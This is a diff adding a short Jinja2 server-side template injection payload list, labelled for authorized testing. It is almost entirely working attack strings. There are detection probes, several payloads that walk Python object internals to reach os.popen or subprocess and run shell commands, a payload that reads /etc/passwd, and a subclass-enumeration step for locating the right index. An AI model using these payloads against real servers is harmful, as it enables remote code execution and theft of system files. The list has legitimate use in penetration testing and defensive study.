@@ -1,0 +1,20 @@
+# Jinja2 SSTI — RCE payloads (authorized testing only)
+
+# Detection
+{{7*7}}
+{{config}}
+
+# RCE — os.popen
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# RCE — subprocess
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
+
+# Alternative globals path
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Read file
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+
+# Note: subclass index varies by Python version — enumerate with:
+{{''.__class__.__mro__[1].__subclasses__()}}
